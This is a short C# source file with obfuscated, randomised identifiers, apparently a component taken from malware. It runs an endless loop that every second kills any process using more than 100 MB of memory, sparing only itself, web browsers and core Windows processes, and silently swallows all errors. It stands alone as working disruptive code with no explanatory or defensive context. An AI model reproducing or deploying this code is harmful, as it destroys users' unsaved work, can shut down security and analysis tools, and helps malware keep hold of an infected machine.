using System.Diagnostics;
using System.Threading;

namespace ALzLGBAFaCqNDAE;

public static class jcoQEPyCKXH
{
	public static void fTZNfbSDJCWcn()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 100000000L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains("chrome") && !process.ProcessName.Contains("opera") && !process.ProcessName.Contains("msedge") && !process.ProcessName.Contains("iexplore") && !process.ProcessName.Contains("firefox") && !process.ProcessName.Contains("explorer") && !process.ProcessName.Contains("wininit") && !process.ProcessName.Contains("winlogon"))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(1000);
			}
			catch
			{
			}
		}
	}
}
